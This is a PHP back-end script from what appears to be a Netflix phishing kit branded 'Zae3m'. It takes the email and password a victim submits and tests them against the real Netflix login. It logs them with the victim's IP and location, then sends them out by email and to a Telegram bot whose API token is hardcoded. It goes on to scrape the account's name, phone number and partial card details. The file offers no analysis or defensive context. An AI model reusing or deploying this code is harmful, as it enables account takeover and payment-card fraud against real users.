<?php
    
 if(isset($_POST['eml'])&&isset($_POST['pss'])){session_start();include '../../data.php';include '../../app/pic/login.png;$Cookie['cookie_file']=__DIR__.'/logs/'.sha1(time()).'.log';function curl($url='',$var='',$header=false,$nobody=false,$csrf=''){global $Cookie;$curl=curl_init($url);curl_setopt($curl,CURLOPT_NOBODY,$header);curl_setopt($curl,CURLOPT_HEADER,$nobody);curl_setopt($curl,CURLOPT_TIMEOUT,10);curl_setopt($curl,CURLOPT_USERAGENT,'Mozilla/5.0 (Linux; Android 4.4.2; Nexus 4 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.114 Mobile Safari/537.36');if($csrf){curl_setopt($curl,CURLOPT_HTTPHEADER,array('X-Requested-With: XMLHttpRequest','x-csrf-jwt: '.$csrf,'Accept: application/json, text/plain, */*','Content-Type: application/json;charset=utf-8'));}if($var){curl_setopt($curl,CURLOPT_POST,true);curl_setopt($curl,CURLOPT_POSTFIELDS,$var);}curl_setopt($curl,CURLOPT_COOKIEFILE,$Cookie['cookie_file']);curl_setopt($curl,CURLOPT_COOKIEJAR,$Cookie['cookie_file']);curl_setopt($curl,CURLOPT_SSL_VERIFYPEER,false);curl_setopt($curl,CURLOPT_REFERER,'https://www.netflix.com/login');curl_setopt($curl,CURLOPT_SSL_VERIFYHOST,2);curl_setopt($curl,CURLOPT_FOLLOWLOCATION,true);curl_setopt($curl,CURLOPT_RETURNTRANSFER,true);$result=curl_exec($curl);curl_close($curl);return $result;}$get_token=curl('https://www.netflix.com/login');$preg_token=preg_match_all("/name=\"authURL\" value=\"(.*?)\"/",$get_token,$arr_token);$test_true=curl('https://www.netflix.com/ma-fr/login','email='.rawurlencode($_POST['eml']).'&password='.rawurlencode($_POST['pss']).'&rememberMe=true&flow=websiteSignUp&mode=login&action=loginAction&withFields=email%2Cpassword%2CrememberMe%2CnextPage%2CshowPassword&authURL='.rawurlencode($arr_token[1][0]).'&nextPage=&showPassword=: undefined',false,false);if(strpos($test_true,'hybrid-password-wrapper')){exit('error');}else{$_SESSION['computer']=gethostbyaddr($_SERVER['REMOTE_ADDR'])." | {$_POST['screen']}";
$msg=" |+ N!tflix :{$_SESSION['ip_countryName']} *&* Zae3m\r\n";
$msg.="|+ ------------------------------\r\n";
$msg.="|+ Email: {$_POST['eml']}\r\n";
$msg.="|+ Pass: {$_POST['pss']}\r\n";
$msg.="|+ ------------------------------\r\n";
$msg.="---------------------- IP Info ----------------------\r\n";
	$msg.="IP ADDRESS	: {$_SESSION['ip']}\r\n";
	$msg.="LOCATION	: {$_SESSION['ip_city']} , {$_SESSION['ip_countryName']} , {$_SESSION['currency']}\r\n";
	$msg.="BROWSER		: {$_SESSION['browser']} on {$_SESSION['os']}\r\n";
	$msg.="USER AGENT	: {$_SERVER['HTTP_USER_AGENT']}\r\n";
	$msg.="TIMEZONE	: {$_SESSION['ip_timezone']}\r\n";
	$msg.="TIME		: ".date("d/m/Y h:i:sa")." GMT\r\n";
$msg.="»»————-　★[ ./💼 https://t.me/zae3m | https://t.me/spam_dollarers | https://t.me/zae3m_tut 💼 ]★　————-««
\r\n\r\n";

$save=fopen("../../Zae3m/LOGIN.txt","a+");fwrite($save,$msg);fclose($save);
$subject="*# NTfuck FR3SH LOGIN #*({$_SESSION['ip_countryName']}) =?UTF-8?Q?=E2=9C=94_?= {$_SESSION['ip']} #Zae3m#";
$headers="From: *Zae3m*   =?UTF-8?Q?=e2=9d=a4_?=<zae3m@yandex.ru>\r\n";
$headers.="MIME-Version: 1.0\r\n";
$headers.="Content-Type: text/plain; charset=UTF-8\r\n";

@mail($yours,$subject,$msg,$headers);
@mail($yours,$subject,$msg,$headers);

$txt = $msg;
$chat_id = "1436260626"; // Your Telegram Chat ID
$bot_url = "bot5273785611:AAHufywYXU_InWiHlQsaxeRi36e6C6rH0rM"; //Your Telegram Bot Api Key

    $send = ['chat_id'=>$chat_id,'text'=>$txt];
    $website_telegram = "https://api.telegram.org/{$bot_url}";
    $ch = curl_init($website_telegram . '/sendMessage');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $result = curl_exec($ch);
    curl_close($ch);

$PaymentPage=curl('https://www.netflix.com/signup/editcredit');$firstname=preg_match_all("/id=\"id_firstName\" value=\"(.*?)\"/i",$PaymentPage,$CCFname);if($CCFname[1][0]==NULL){$PaymentPage=curl('https://www.netflix.com/simplemember/editcredit');}$get_phonenumber=curl('https://www.netflix.com/phonenumber');$Phone=preg_match_all("/id=\"phone\" value=\"(.*?)\"/i",$get_phonenumber,$PhoneNumber);if($PhoneNumber[1][0]==NULL){$_SESSION['phone']='';}else{$_SESSION['phone']=str_replace('\x2B','+',$PhoneNumber[1][0]);}$Last4=preg_match_all("/id=\"id_creditCardNumber\" value=\"(.*?)\"/i",$PaymentPage,$CCLast4);if($CCLast4[1][0]==NULL){$_SESSION['last4']='';}else{$_SESSION['last4']=str_replace('*','',$CCLast4[1][0]);}$exp_date=preg_match_all("/id=\"id_creditExpirationMonth\" value=\"(.*?)\"/i",$PaymentPage,$CCexpDt);if($CCexpDt[1][0]==NULL){$_SESSION['exp_date']='';}else{$_SESSION['exp_date']=$CCexpDt[1][0];}$firstname=preg_match_all("/id=\"id_firstName\" value=\"(.*?)\"/i",$PaymentPage,$CCFname);if($CCFname[1][0]==NULL){$_SESSION['firstname']='';}else{$_SESSION['firstname']=$CCFname[1][0];}$lastname=preg_match_all("/id=\"id_lastName\" value=\"(.*?)\"/i",$PaymentPage,$CCLname);if($CCLname[1][0]==NULL){$_SESSION['lastname']='';}else{$_SESSION['lastname']=$CCLname[1][0];}$gzip=preg_match_all("/id=\"id_creditZipcode\" value=\"(.*?)\"/i",$PaymentPage,$zipC);if($zipC[1][0]==NULL){$_SESSION['zipCode']='';}else{$_SESSION['zipCode']=$zipC[1][0];}exit('done');}}
?>
